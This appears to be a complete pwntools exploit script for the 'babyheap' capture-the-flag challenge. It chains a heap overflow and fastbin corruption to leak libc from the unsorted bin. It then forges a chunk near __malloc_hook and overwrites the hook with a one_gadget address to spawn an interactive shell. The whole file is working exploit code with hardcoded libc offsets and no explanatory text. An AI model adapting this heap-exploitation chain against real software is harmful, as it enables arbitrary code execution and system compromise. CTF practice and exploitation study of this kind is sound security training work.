from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./babyheap"
babyheap = context.binary
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./babyheap")
log.info('PID: ' + str(proc.pidof(p)[0]))


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


offset_unsortedbin_main_arena = offset_bin_main_arena(0)


def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))


def fill(idx, size, content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)


def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))


def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))


def exp():
# stage1:leak libc
    #gdb.attach(p)
    allocate(0x10)    #id=0
    allocate(0x10)    #id=1 
    allocate(0x10)    #id=2
    allocate(0x10)    #id=3
    allocate(0x80)    #id=4
    free(2)
    free(1)           #fastbin:1->2->null
    payload = 'a' * 0x10 + p64(0) + p64(0x21) + '\x80'
    fill(0,len(payload),payload)   #overflow=>fastbin:1->4->null
    payload = 'b' * 0x10 + p64(0) + p64(0x21)
    fill(3,len(payload),payload)
    allocate(0x10)   #id=1
    allocate(0x10)   #id=2 get chunk at id4
    payload = 'c' * 0x10 + p64(0) + p64(0x91)
    fill(3,len(payload),payload)
    allocate(0x80)   #id=5  
    free(4)          #put chunk at unsorted_bin
    dump(2)
    p.recvuntil(': \n',drop=True)
    unsorted_bin = u64(p.recv(8))
    log.info("get unsorted_bin address at:" + hex(unsorted_bin))
    main_arena_offset = 0x3c4b20
    libc_base = unsorted_bin - offset_unsortedbin_main_arena - main_arena_offset
    main_arena = libc_base + main_arena_offset
    log.success("libc base address at :" + hex(libc_base))
# stage2:write malloc_hook,get shell
    fake_chunk = main_arena - 0x33 
    allocate(0x60)  #id=4,alloc at fake_chunk
    free(4)   #fastbin:4->null
    payload = 'd' * 0x10 + p64(0) +  p64(0x71) + p64(fake_chunk)
    fill(3,len(payload),payload) #fastbin:4->fake_chunk
    allocate(0x60)    #id=4
    allocate(0x60)    #id=6
    one_gadget = libc_base + 0x4526a #0x45216 0x4526a,0xf02a4,0xf1147
    log.info("one gadget at " + hex(one_gadget))
    payload = '\x00' * 0x13 + p64(one_gadget)
    fill(6,len(payload),payload)
    #raw_input()
    allocate(0x10)
    p.interactive()


if __name__ == "__main__":
    exp()
